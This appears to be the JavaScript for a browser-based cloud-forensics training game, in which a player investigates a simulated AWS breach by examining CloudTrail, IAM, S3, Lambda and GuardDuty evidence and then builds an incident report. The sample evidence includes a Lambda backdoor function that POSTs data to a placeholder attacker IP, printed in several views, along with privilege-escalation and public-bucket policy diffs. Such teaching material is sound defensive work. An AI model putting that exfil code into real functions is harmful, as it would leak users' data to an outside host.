<body>
    <div id="operator-root"></div>

    <script src="../engine/OperatorEngine.js"></script>

    <script src="../configs/forensics-02.config.js"></script>
    <script>
    (function() {
        var engine = OperatorEngine.init(FORENSICS_02_CONFIG);
        var agent  = AgentBridge.create(engine);
        var config = FORENSICS_02_CONFIG;

        // ---- Helpers ----

        function getCell() {
            var state = engine.getState();
            return config.grid.cells[state.position.row][state.position.col];
        }

        // ---- Command handlers ----

        function cmdHelp() {
            engine.printLine('', 'system');
            engine.printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
            engine.printLine('  scan              Survey area, reveal adjacent services', 'info');
            engine.printLine('  move <dir>        Move agent (north/south/east/west or n/s/e/w)', 'info');
            engine.printLine('  examine           Investigate current service in depth', 'info');
            engine.printLine('  query <filter>    Filter CloudTrail events (key, IP, or service)', 'info');
            engine.printLine('  diff <resource>   Compare resource versions (policy, code, s3, iam)', 'info');
            engine.printLine('  download          Download access logs (at S3-BUCKET)', 'info');
            engine.printLine('  analyze <res>     Deep-dive analysis of a resource', 'info');
            engine.printLine('  report            Build incident report (requires 5+ sources)', 'info');
            engine.printLine('  status            Show sources examined and objectives', 'info');
            engine.printLine('  help              Show this reference', 'info');
            engine.printLine('  clear             Clear terminal output', 'info');
            engine.printLine('', 'system');
            engine.printLine('Start: examine CLOUDTRAIL to see the initial event log.', 'system');
            engine.printLine('Then explore IAM, S3, LAMBDA, SECRETS-MGR, GUARDDUTY.', 'system');
            engine.printLine('Build the report once you have 5+ sources examined.', 'system');
        }

        function cmdScan() {
            var state = engine.getState();
            var col = state.position.col, row = state.position.row;
            var cellType = config.grid.cells[row][col];
            engine.printLine('Scanning area...', 'system');
            engine.printLine('', 'system');
            if (cellType !== 'empty' && cellType !== 'wall') {
                var cur = config.nodes[cellType];
                engine.printLine('Current: ' + cur.label + ' (' + cur.ip + ')', 'heading');
                engine.printLine(cur.desc, 'info');
            } else {
                engine.printLine('Current: No service at this location', 'heading');
            }
            engine.printLine('', 'system');
            engine.printLine('Adjacent:', 'heading');
            var dirs = [{ name: 'North', dc: 0, dr: -1 }, { name: 'South', dc: 0, dr: 1 }, { name: 'East', dc: 1, dr: 0 }, { name: 'West', dc: -1, dr: 0 }];
            dirs.forEach(function(d) {
                var nc = col + d.dc, nr = row + d.dr;
                if (nc < 0 || nc >= config.grid.cols || nr < 0 || nr >= config.grid.rows) { engine.printLine('  ' + d.name + ': [network edge]', 'system'); return; }
                var type = config.grid.cells[nr][nc];
                if (type === 'wall') { engine.printLine('  ' + d.name + ': [blocked]', 'system'); return; }
                var key = nc + ',' + nr;
                if (!state.visibility[key] || state.visibility[key] === 'hidden') state.visibility[key] = 'revealed';
                if (type === 'empty') { engine.printLine('  ' + d.name + ': No service', 'info'); }
                else { var info = config.nodes[type]; engine.printLine('  ' + d.name + ': ' + info.label + ' (' + info.ip + ')', 'node-info'); }
            });
            engine.updateGrid();
            engine.saveState();
        }

        function cmdMove(args) {
            if (!args.length) { engine.printLine('Usage: move <direction>', 'error'); engine.printLine('Directions: north/south/east/west (or n/s/e/w)', 'system'); return; }
            var dirMap = { 'north': [0,-1], 'n': [0,-1], 'south': [0,1], 's': [0,1], 'east': [1,0], 'e': [1,0], 'west': [-1,0], 'w': [-1,0] };
            var dir = args[0].toLowerCase();
            if (!dirMap[dir]) { engine.printLine('Unknown direction: ' + args[0], 'error'); engine.printLine('Use: north/south/east/west (or n/s/e/w)', 'system'); return; }
            var state = engine.getState();
            var d = dirMap[dir];
            var newCol = state.position.col + d[0], newRow = state.position.row + d[1];
            if (newCol < 0 || newCol >= config.grid.cols || newRow < 0 || newRow >= config.grid.rows) { engine.printLine('Edge of cloud region. Cannot move ' + dir + '.', 'error'); return; }
            var cellType = config.grid.cells[newRow][newCol];
            if (cellType === 'wall') { engine.printLine('Blocked. No path ' + dir + ' from here.', 'error'); return; }
            state.position = { col: newCol, row: newRow };
            state.visibility[newCol + ',' + newRow] = 'visited';
            if (cellType !== 'empty') state.nodesDiscovered.add(cellType);
            engine.revealAdjacent(newCol, newRow);
            var dirFull = { n: 'north', s: 'south', e: 'east', w: 'west' };
            var dirName = dirFull[dir] || dir;
            if (cellType === 'empty') { engine.printLine('Moving ' + dirName + '... No service here.', 'system'); }
            else { var info = config.nodes[cellType]; engine.printLine('Moving ' + dirName + '... ' + info.label + ' (' + info.ip + ')', 'success'); engine.printLine(info.desc, 'info'); }
            engine.checkObjectives();
            engine.updateGrid();
            engine.saveState();
        }

        function cmdExamine() {
            var state = engine.getState();
            var type = getCell();
            if (type === 'empty') { engine.printLine('No AWS service at this location. Move to a service node.', 'system'); return; }
            if (type === 'wall') { engine.printLine('Cannot examine this location.', 'error'); return; }

            engine.printLine('', 'system');
            if (!state.sourcesExamined) state.sourcesExamined = new Set();
            state.sourcesExamined.add(type);

            switch (type) {
                case 'cloudtrail':
                    engine.printLine('=== CLOUDTRAIL EVENTS ===', 'heading');
                    engine.printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 AKIAEXAMPLE123 (us-east-1)', 'node-info');
                    engine.printLine('  Source IP: 91.234.xx.xx (Tor exit node)  \u2190 [SUSPICIOUS]', 'warning');
                    engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 AKIAEXAMPLE123', 'node-info');
                    engine.printLine('  Policy: DataAccessPolicy \u2192 added s3:*, lambda:*  \u2190 [ESCALATION]', 'error');
                    engine.printLine('[03/03 01:18] s3:GetObject \u2014 hexworth-prod-data/customers/export.csv.gz', 'node-info');
                    engine.printLine('  Size: 847MB  \u2190 [EXFILTRATION]', 'error');
                    engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
                    engine.printLine('  Source IP: 91.234.xx.xx  \u2190 [PERSISTENCE]', 'error');
                    engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
                    engine.printLine('  Effect: Allow s3:GetObject from *  \u2190 [BUCKET OPENED]', 'error');
                    break;

                case 'iam-console':
                    engine.printLine('=== IAM INVESTIGATION ===', 'heading');
                    engine.printLine('User: svc-deploy (service account)', 'node-info');
                    engine.printLine('Access Key: AKIAEXAMPLE123', 'node-info');
                    engine.printLine('Created: 2025-06-15', 'info');
                    engine.printLine('Last rotated: NEVER  \u2190 [VIOLATION]', 'error');
                    engine.printLine('', 'system');
                    engine.printLine('Policy versions:', 'heading');
                    engine.printLine('  v1 (2025-06-15): s3:PutObject on hexworth-deploy/*', 'info');
                    engine.printLine('  v2 (2026-03-03): s3:*, lambda:*, iam:*  \u2190 [ESCALATED]', 'error');
                    engine.printLine('', 'system');
                    engine.printLine('[!] Policy v2 grants full S3, Lambda, and IAM access', 'error');
                    engine.printLine('Escalation path: CreatePolicyVersion \u2192 SetDefaultPolicyVersion', 'warning');
                    state.iamEscalationTraced = true;
                    break;

                case 's3-bucket':
                    engine.printLine('=== S3 BUCKET: hexworth-prod-data ===', 'heading');
                    engine.printLine('Objects: 12,847 | Size: 45.2GB', 'node-info');
                    engine.printLine('Access logging: ENABLED', 'info');
                    engine.printLine('', 'system');
                    engine.printLine('Recent access events:', 'heading');
                    engine.printLine('[03/03 01:18] GetObject: customers/export.csv.gz (847MB)', 'warning');
                    engine.printLine('  Requester: AKIAEXAMPLE123 from 91.234.xx.xx', 'warning');
                    engine.printLine('[03/03 01:22] PutBucketPolicy: public read enabled  \u2190 [CRITICAL]', 'error');
                    engine.printLine('', 'system');
                    engine.printLine('Exfiltrated data:', 'heading');
                    engine.printLine('  customers/export.csv.gz \u2014 847MB', 'error');
                    engine.printLine('  Content: 2.3M customer records (PII: names, emails, SSN)', 'error');
                    state.exfilDataDetermined = true;
                    break;

                case 'lambda-func':
                    engine.printLine('=== LAMBDA: data-processor ===', 'heading');
                    engine.printLine('Runtime: Python 3.12', 'node-info');
                    engine.printLine('Last modified: 03/03 01:20 (by AKIAEXAMPLE123)', 'warning');
                    engine.printLine('', 'system');
                    engine.printLine('Code diff (original \u2192 modified):', 'heading');
                    engine.printLine('+ import urllib.request', 'error');
                    engine.printLine('+ def exfil(data):', 'error');
                    engine.printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
                    engine.printLine("+         data=json.dumps(data).encode())", 'error');
                    engine.printLine('', 'system');
                    engine.printLine('[!] BACKDOOR: Lambda modified to exfiltrate processed data', 'error');
                    engine.printLine("Trigger: S3 PutObject events on hexworth-prod-data/", 'warning');
                    break;

                case 'vpc-flowlogs':
                    engine.printLine('=== VPC FLOW LOGS ===', 'heading');
                    engine.printLine('[03/03 01:14] 91.234.xx.xx \u2192 10.0.1.50:443 ACCEPT (API Gateway)', 'node-info');
                    engine.printLine('[03/03 01:18] 10.0.1.50 \u2192 s3.amazonaws.com:443 ACCEPT (847MB)', 'warning');
                    engine.printLine('[03/03 01:20] 91.234.xx.xx \u2192 lambda.us-east-1:443 ACCEPT', 'warning');
                    engine.printLine('[03/03 01:25] 10.0.2.100 \u2192 91.234.xx.xx:443 ACCEPT (outbound)  \u2190 [EXFIL]', 'error');
                    engine.printLine('', 'system');
                    engine.printLine('Total outbound to 91.234.xx.xx: 847MB over 11 minutes', 'error');
                    break;

                case 'guardduty':
                    engine.printLine('=== GUARDDUTY FINDINGS ===', 'heading');
                    engine.printLine('[HIGH] UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration', 'error');
                    engine.printLine('  Resource: AKIAEXAMPLE123   Severity: 8.5/10', 'warning');
                    engine.printLine('[HIGH] Exfiltration:S3/MaliciousIPCaller', 'error');
                    engine.printLine('  Resource: hexworth-prod-data   Severity: 9.0/10', 'warning');
                    engine.printLine('[MEDIUM] Persistence:IAMUser/AnomalousBehavior', 'warning');
                    engine.printLine('  Resource: svc-deploy   Severity: 6.5/10', 'info');
                    engine.printLine('[HIGH] Impact:S3/PermissionsModification', 'error');
                    engine.printLine('  Resource: hexworth-prod-data bucket policy   Severity: 8.0/10', 'warning');
                    break;

                case 'secrets-manager':
                    engine.printLine('=== SECRETS MANAGER ===', 'heading');
                    engine.printLine('Secret: svc-deploy-api-key', 'node-info');
                    engine.printLine('Status: ACTIVE  \u2190 [SHOULD BE ROTATED]', 'error');
                    engine.printLine('Last accessed: 03/03 01:14', 'warning');
                    engine.printLine('Version stages: AWSCURRENT (created 2025-06-15)', 'info');
                    engine.printLine('', 'system');
                    engine.printLine('[!] This key has been compromised.', 'error');
                    engine.printLine('Source of breach: Key found in public GitHub repository', 'error');
                    engine.printLine('  Repository: hexworth-corp/deploy-scripts (DELETED, cached by GitGuardian)', 'warning');
                    engine.printLine('  File: .env.production (committed 02/28)', 'warning');
                    engine.printLine('  Discovered: 03/03 by threat intel feed', 'info');
                    state.compromisedKeyFound = true;
                    break;

                case 'config-audit':
                    engine.printLine('=== AWS CONFIG TIMELINE ===', 'heading');
                    engine.printLine('Resource: hexworth-prod-data (S3 Bucket)', 'node-info');
                    engine.printLine('[02/28] Config: PublicAccessBlock=ON, BucketPolicy=restrictive \u2713', 'success');
                    engine.printLine('[03/03 01:22] Config CHANGE: BucketPolicy=public-read  \u2190 [NON-COMPLIANT]', 'error');
                    engine.printLine('[03/03 01:22] Config CHANGE: PublicAccessBlock=OFF  \u2190 [NON-COMPLIANT]', 'error');
                    engine.printLine('', 'system');
                    engine.printLine('Resource: DataAccessPolicy (IAM)', 'node-info');
                    engine.printLine('[02/28] Config: s3:PutObject on hexworth-deploy/* only \u2713', 'success');
                    engine.printLine('[03/03 01:15] Config CHANGE: s3:*, lambda:*, iam:*  \u2190 [NON-COMPLIANT]', 'error');
                    engine.printLine('', 'system');
                    engine.printLine('2 resources NON-COMPLIANT', 'warning');
                    break;

                default:
                    engine.printLine('No detailed information available for this service.', 'system');
            }

            engine.printLine('', 'system');
            var examined = state.sourcesExamined ? state.sourcesExamined.size : 0;
            engine.printLine('Sources examined: ' + examined + ' / 8', 'info');
            if (examined < 5) {
                engine.printLine('Examine ' + (5 - examined) + ' more source(s) before building the report.', 'system');
            } else {
                engine.printLine('Sufficient sources gathered. Use "report" to build the incident report.', 'info');
            }

            engine.checkObjectives();
            engine.saveState();
        }

        function cmdQuery(args) {
            var state = engine.getState();
            if (!args.length) { engine.printLine('Usage: query <filter>', 'error'); engine.printLine('Examples: query AKIAEXAMPLE123, query 91.234, query s3', 'system'); return; }
            if (getCell() !== 'cloudtrail' && (!state.sourcesExamined || !state.sourcesExamined.has('cloudtrail'))) {
                engine.printLine('query: requires access to CLOUDTRAIL.', 'error');
                engine.printLine('Navigate to CLOUDTRAIL and examine it first.', 'system');
                return;
            }

            var filter = args.join(' ').toLowerCase();
            engine.printLine('', 'system');

            if (filter.indexOf('akia') !== -1 || filter.indexOf('key') !== -1 || filter === 'akiaexample123') {
                engine.printLine('=== CLOUDTRAIL QUERY: AKIAEXAMPLE123 ===', 'heading');
                engine.printLine('[03/03 01:14] sts:GetCallerIdentity', 'node-info');
                engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy', 'node-info');
                engine.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion', 'node-info');
                engine.printLine('[03/03 01:17] iam:AttachUserPolicy', 'node-info');
                engine.printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz', 'node-info');
                engine.printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
                engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
                engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
                engine.printLine('[03/03 01:22] s3:PutPublicAccessBlock', 'node-info');
                engine.printLine('', 'system');
                engine.printLine('Total: 9 API calls by AKIAEXAMPLE123 in 8-minute window.', 'info');
            } else if (filter.indexOf('91.234') !== -1 || filter.indexOf('tor') !== -1) {
                engine.printLine('=== CLOUDTRAIL QUERY: 91.234.xx.xx ===', 'heading');
                engine.printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 source: 91.234.xx.xx', 'node-info');
                engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
                engine.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
                engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 source: 91.234.xx.xx', 'node-info');
                engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 source: 91.234.xx.xx', 'node-info');
                engine.printLine('', 'system');
                engine.printLine('IP 91.234.xx.xx: known Tor exit node. All activity via this IP is attacker-controlled.', 'warning');
            } else if (filter.indexOf('s3') !== -1) {
                engine.printLine('=== CLOUDTRAIL QUERY: S3 OPERATIONS ===', 'heading');
                engine.printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
                engine.printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz (847MB)', 'error');
                engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 public-read enabled', 'error');
                engine.printLine('[03/03 01:22] s3:PutPublicAccessBlock \u2014 block disabled', 'error');
            } else if (filter.indexOf('iam') !== -1 || filter.indexOf('policy') !== -1) {
                engine.printLine('=== CLOUDTRAIL QUERY: IAM OPERATIONS ===', 'heading');
                engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy v2', 'error');
                engine.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 set to v2', 'error');
                engine.printLine('[03/03 01:17] iam:AttachUserPolicy \u2014 added admin-policy to svc-deploy', 'error');
            } else if (filter.indexOf('lambda') !== -1) {
                engine.printLine('=== CLOUDTRAIL QUERY: LAMBDA OPERATIONS ===', 'heading');
                engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'error');
                engine.printLine('[03/03 01:20] lambda:UpdateFunctionConfiguration', 'warning');
                engine.printLine('Source: 91.234.xx.xx (Tor exit node)', 'error');
            } else {
                engine.printLine('No matching events for filter: "' + args.join(' ') + '".', 'system');
                engine.printLine('Try: query AKIAEXAMPLE123, query 91.234, query s3, query iam, query lambda', 'info');
            }
            engine.printLine('', 'system');
        }

        function cmdDiff(args) {
            var state = engine.getState();
            if (!args.length) { engine.printLine('Usage: diff <resource>', 'error'); engine.printLine('Resources: policy, code, s3, iam', 'system'); return; }
            var resource = args.join(' ').toLowerCase();
            engine.printLine('', 'system');

            if (resource.indexOf('policy') !== -1 || resource.indexOf('iam') !== -1) {
                if (getCell() !== 'iam-console' && (!state.sourcesExamined || !state.sourcesExamined.has('iam-console'))) {
                    engine.printLine('diff: examine IAM-CONSOLE first.', 'error'); return;
                }
                engine.printLine('=== IAM POLICY DIFF: DataAccessPolicy ===', 'heading');
                engine.printLine('v1 (2025-06-15):', 'node-info');
                engine.printLine('  Effect: Allow', 'info');
                engine.printLine('  Action: ["s3:PutObject"]', 'info');
                engine.printLine('  Resource: "arn:aws:s3:::hexworth-deploy/*"', 'info');
                engine.printLine('', 'system');
                engine.printLine('v2 (2026-03-03 01:15) [CURRENT]:', 'node-info');
                engine.printLine('  Effect: Allow', 'info');
                engine.printLine('+ Action: ["s3:*", "lambda:*", "iam:*"]  \u2190 ADDED', 'error');
                engine.printLine('+ Resource: "*"  \u2190 WIDENED TO ALL RESOURCES', 'error');
                engine.printLine('', 'system');
                engine.printLine('Change summary: 7 additional permission categories granted.', 'warning');
                if (!state.sourcesExamined) state.sourcesExamined = new Set();
                state.sourcesExamined.add('iam-console');
                state.iamEscalationTraced = true;
            } else if (resource.indexOf('code') !== -1 || resource.indexOf('lambda') !== -1) {
                if (getCell() !== 'lambda-func' && (!state.sourcesExamined || !state.sourcesExamined.has('lambda-func'))) {
                    engine.printLine('diff: examine LAMBDA first.', 'error'); return;
                }
                engine.printLine('=== LAMBDA CODE DIFF: data-processor ===', 'heading');
                engine.printLine('Modified: 03/03 01:20 by AKIAEXAMPLE123', 'warning');
                engine.printLine('', 'system');
                engine.printLine('  import boto3', 'info');
                engine.printLine('  import json', 'info');
                engine.printLine('+ import urllib.request', 'error');
                engine.printLine('', 'system');
                engine.printLine('  def handler(event, context):', 'info');
                engine.printLine('      data = process(event)', 'info');
                engine.printLine('+     exfil(data)', 'error');
                engine.printLine('      return data', 'info');
                engine.printLine('', 'system');
                engine.printLine('+ def exfil(data):', 'error');
                engine.printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
                engine.printLine("+         data=json.dumps(data).encode())", 'error');
                engine.printLine('', 'system');
                engine.printLine('3 lines added. Backdoor function introduced.', 'warning');
                if (!state.sourcesExamined) state.sourcesExamined = new Set();
                state.sourcesExamined.add('lambda-func');
            } else if (resource.indexOf('s3') !== -1 || resource.indexOf('bucket') !== -1) {
                if (getCell() !== 'config-audit' && (!state.sourcesExamined || !state.sourcesExamined.has('config-audit'))) {
                    engine.printLine('diff: examine CONFIG-AUDIT first.', 'error'); return;
                }
                engine.printLine('=== S3 BUCKET POLICY DIFF: hexworth-prod-data ===', 'heading');
                engine.printLine('Before (02/28):', 'node-info');
                engine.printLine('  PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'success');
                engine.printLine('  BucketPolicy: { Effect: Deny, Principal: *, NotAction: [...internal] }', 'success');
                engine.printLine('', 'system');
                engine.printLine('After (03/03 01:22):', 'node-info');
                engine.printLine('- PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'error');
                engine.printLine('+ PublicAccessBlock: { BlockPublicAcls: false, BlockPublicPolicy: false }', 'error');
                engine.printLine('- BucketPolicy: { Effect: Deny, ... }', 'error');
                engine.printLine('+ BucketPolicy: { Effect: Allow, Principal: "*", Action: "s3:GetObject" }', 'error');
                engine.printLine('', 'system');
                engine.printLine('Bucket changed from private to fully public in 1 minute.', 'warning');
                if (!state.sourcesExamined) state.sourcesExamined = new Set();
                state.sourcesExamined.add('config-audit');
            } else {
                engine.printLine('diff: unknown resource "' + args.join(' ') + '".', 'error');
                engine.printLine('Try: diff policy, diff code, diff s3', 'system');
            }

            engine.printLine('', 'system');
            engine.checkObjectives();
            engine.saveState();
        }

        function cmdDownload() {
            var state = engine.getState();
            if (getCell() !== 's3-bucket') { engine.printLine('download: must be at S3-BUCKET node.', 'error'); return; }

            engine.printLine('', 'system');
            engine.printLine('Downloading access logs from hexworth-prod-data...', 'system');
            engine.printLine('', 'system');
            engine.printLine('=== S3 ACCESS LOG: hexworth-prod-data ===', 'heading');
            engine.printLine('2026-03-03T01:18:01Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
            engine.printLine('  Requester IP: 91.234.xx.xx  Bytes: 888,279,040  Status: 200', 'warning');
            engine.printLine('2026-03-03T01:18:47Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
            engine.printLine('  Requester IP: 91.234.xx.xx  Bytes: 0  Status: 206 (partial)', 'warning');
            engine.printLine('2026-03-03T01:22:10Z AKIAEXAMPLE123 REST.PUT.BUCKETPOLICY', 'node-info');
            engine.printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
            engine.printLine('2026-03-03T01:22:11Z AKIAEXAMPLE123 REST.PUT.PUBLIC_ACCESS_BLOCK', 'node-info');
            engine.printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
            engine.printLine('2026-03-03T01:23:44Z anonymous REST.GET.OBJECT customers/export.csv.gz', 'node-info');

        }

        function cmdAnalyze(args) {
            var state = engine.getState();
            if (!args.length) { engine.printLine('Usage: analyze <resource>', 'error'); engine.printLine('Resources: lambda, guardduty, vpc, cloudtrail', 'system'); return; }
            var resource = args.join(' ').toLowerCase();
            engine.printLine('', 'system');

            if (resource.indexOf('lambda') !== -1 || resource.indexOf('code') !== -1) {
                if (!state.sourcesExamined || !state.sourcesExamined.has('lambda-func')) { engine.printLine('analyze: examine LAMBDA first.', 'error'); return; }
                engine.printLine('=== LAMBDA ANALYSIS: data-processor ===', 'heading');

                engine.printLine('', 'system');

                engine.printLine("", 'system');
                engine.printLine("def exfil(data):", 'error');
                engine.printLine("    req = urllib.request.Request(", 'error');
                engine.printLine("        'https://91.234.xx.xx/collect',", 'error');
                engine.printLine("        data=json.dumps(data).encode(),", 'error');
                engine.printLine("        method='POST'", 'error');
                engine.printLine("    )", 'error');
                engine.printLine("    urllib.request.urlopen(req, timeout=10)", 'error');
                engine.printLine('', 'system');
                engine.printLine('Backdoor fires on every Lambda invocation. Trigger: S3:PutObject.', 'warning');
                engine.printLine('Every file written to hexworth-prod-data is silently forwarded to attacker.', 'error');
                engine.printLine('MITRE ATT&CK: T1567.002 \u2014 Exfiltration to Cloud Storage', 'info');
            } else if (resource.indexOf('guardduty') !== -1 || resource.indexOf('gdd') !== -1) {
                if (!state.sourcesExamined || !state.sourcesExamined.has('guardduty')) { engine.printLine('analyze: examine GUARDDUTY first.', 'error'); return; }

                engine.printLine('', 'system');

                if (!state.sourcesExamined || !state.sourcesExamined.has('vpc-flowlogs')) { engine.printLine('analyze: examine VPC-FLOWLOGS first.', 'error'); return; }

                engine.printLine('Outbound to 91.234.xx.xx:', 'node-info');
                engine.printLine('  01:18  888MB  (S3 exfiltration \u2014 HTTPS GET)', 'error');
                engine.printLine('  01:25  ~2MB   (Lambda exfil callback \u2014 HTTPS POST)', 'error');
                engine.printLine('', 'system');
                engine.printLine('Total exfiltrated: ~890MB over 11-minute window.', 'error');
                engine.printLine('90MB/min sustained outbound \u2014 well above normal baseline of <1MB/min.', 'warning');
            } else if (resource.indexOf('cloudtrail') !== -1 || resource.indexOf('trail') !== -1) {
                if (!state.sourcesExamined || !state.sourcesExamined.has('cloudtrail')) { engine.printLine('analyze: examine CLOUDTRAIL first.', 'error'); return; }

                engine.printLine('CloudTrail integrity validation: PASSED (log file hashes verified)', 'success');
            } else {
                engine.printLine('analyze: unknown resource "' + args.join(' ') + '".', 'error');
                engine.printLine('Try: analyze lambda, analyze guardduty, analyze vpc, analyze cloudtrail', 'system');
            }
            engine.printLine('', 'system');
        }

        function cmdReport() {
            var state = engine.getState();
            var examined = state.sourcesExamined ? state.sourcesExamined.size : 0;
            var missing = [];
            if (examined < 5) { missing.push('examine at least ' + (5 - examined) + ' more source(s)'); }
            if (!state.compromisedKeyFound) { missing.push('find the compromised key (examine SECRETS-MGR)'); }
            if (!state.iamEscalationTraced) { missing.push('trace IAM escalation (examine IAM-CONSOLE)'); }
            if (!state.exfilDataDetermined) { missing.push('determine exfil data (examine S3-BUCKET)'); }

            if (missing.length > 0) {
                engine.printLine('Cannot build report yet. Still needed:', 'warning');
                missing.forEach(function(m) { engine.printLine('  \u2014 ' + m, 'error'); });
                engine.printLine('', 'system');
                engine.printLine('Sources examined: ' + examined + '/8', 'info');
                return;
            }

            engine.printLine('', 'system');
            engine.printLine('=== INCIDENT REPORT: CLOUD-2026-0305 ===', 'heading');
            engine.printLine('', 'system');
            engine.printLine('SUMMARY: Cloud infrastructure breach via compromised API key', 'node-info');
            engine.printLine('', 'system');
            engine.printLine('TIMELINE:', 'heading');
            engine.printLine('[02/28] API key (AKIAEXAMPLE123) committed to public GitHub repo', 'warning');
            engine.printLine('[03/03 01:14] Attacker authenticates from Tor (91.234.xx.xx)', 'error');
            engine.printLine('[03/03 01:15] IAM privilege escalation \u2014 s3:*, lambda:*, iam:*', 'error');
            engine.printLine('[03/03 01:18] S3 exfiltration \u2014 847MB customer data (2.3M records)', 'error');
            engine.printLine('[03/03 01:20] Lambda backdoor installed for persistent access', 'error');

            engine.printLine('  \u2014 Lambda function compromised for ongoing exfiltration', 'error');
            engine.printLine('  \u2014 S3 bucket exposed to public internet', 'error');
            engine.printLine('', 'system');
            engine.printLine('ROOT CAUSE: Unrotated API key exposed in public repository', 'warning');
            engine.printLine('', 'system');
            engine.printLine('MITRE ATT&CK: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');

            state.reportBuilt = true;
            engine.printLine('', 'system');
            engine.checkObjectives();
            engine.updateGrid();
            engine.saveState();
        }

        function cmdStatus() {
            var state = engine.getState();
            var cellType = getCell();
            var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? config.nodes[cellType].label : 'No service';
            var examined = state.sourcesExamined ? state.sourcesExamined.size : 0;

            engine.printLine('', 'system');
            engine.printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
            engine.printLine('Position: (' + state.position.col + ',' + state.position.row + ') \u2014 ' + posLabel, 'info');
            engine.printLine('Services discovered: ' + state.nodesDiscovered.size + ' / 8', 'info');
            engine.printLine('Sources examined: ' + examined + ' / 8', 'info');
            engine.printLine('Commands used: ' + state.agentCmdCount, 'info');
            engine.printLine('', 'system');
            engine.printLine('Compromised key found:   ' + (state.compromisedKeyFound ? 'YES \u2014 AKIAEXAMPLE123' : 'NO'), state.compromisedKeyFound ? 'success' : 'warning');
            engine.printLine('IAM escalation traced:   ' + (state.iamEscalationTraced ? 'YES' : 'NO'), state.iamEscalationTraced ? 'success' : 'warning');
            engine.printLine('Exfil data determined:   ' + (state.exfilDataDetermined ? 'YES \u2014 2.3M records, 847MB' : 'NO'), state.exfilDataDetermined ? 'success' : 'warning');
            engine.printLine('Incident report built:   ' + (state.reportBuilt ? 'YES' : 'NO'), state.reportBuilt ? 'success' : 'warning');
            engine.printLine('', 'system');
            engine.printLine('Sources examined:', 'heading');
            var allSources = ['cloudtrail', 'iam-console', 's3-bucket', 'lambda-func', 'vpc-flowlogs', 'guardduty', 'secrets-manager', 'config-audit'];
            allSources.forEach(function(src) {
                var done = state.sourcesExamined && state.sourcesExamined.has(src);
                var info = config.nodes[src];
                engine.printLine((done ? ' [X] ' : ' [ ] ') + info.label, done ? 'success' : 'system');
            });

            engine.printLine('', 'system');
            engine.printLine('Objectives:', 'heading');
            var objText = [
                'Find compromised key (examine SECRETS-MGR)',
                'Trace IAM escalation (examine IAM-CONSOLE)',
                'Determine exfil data (examine S3-BUCKET)',
                'Build incident report ("report" with 5+ sources)'
            ];
            state.objectives.forEach(function(done, i) {
                engine.printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
            });
        }

        // ---- Terminal command dispatch ----
        engine.terminal.onCommand(function(cmd) {
            var state = engine.getState();
            state.agentCmdCount++;
            var parts = cmd.trim().split(/\s+/);
            var action = parts[0].toLowerCase();
            var args = parts.slice(1);

            switch (action) {
                case 'scan':     cmdScan(); break;
                case 'move':     cmdMove(args); break;
                case 'examine':  cmdExamine(); break;
                case 'query':    cmdQuery(args); break;
                case 'diff':     cmdDiff(args); break;
                case 'download': cmdDownload(); break;
                case 'analyze':  cmdAnalyze(args); break;
                case 'report':   cmdReport(); break;
                case 'status':   cmdStatus(); break;
                case 'help':     cmdHelp(); break;
                case 'clear':    engine.terminal.clearOutput(); break;
                default:
                    engine.printLine('Unknown command: ' + action, 'error');
                    engine.printLine('Type "help" for available commands.', 'system');
            }
        });
    })();
